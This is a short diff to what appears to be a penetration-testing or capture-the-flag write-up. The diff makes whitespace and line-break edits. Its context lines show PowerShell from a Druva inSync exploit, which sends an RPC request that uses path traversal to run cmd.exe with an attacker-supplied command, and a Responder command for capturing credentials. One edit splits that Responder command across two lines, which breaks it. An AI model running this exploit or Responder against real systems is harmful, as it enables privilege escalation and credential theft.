@@ -370,7 +370,7 @@ $rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
 $command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
 $length = [System.BitConverter]::GetBytes($command.Length);
 
-$s.Send($header)
+$s.Send($header)  
 $s.Send($rpcType)
 $s.Send($length)
 $s.Send($command)
@@ -502,7 +502,8 @@ Command=ToggleDesktop
 
 ```bash
 
-sudo responder  -v -I tun0
+sudo responder
+  -v -I tun0
 
 ```
 
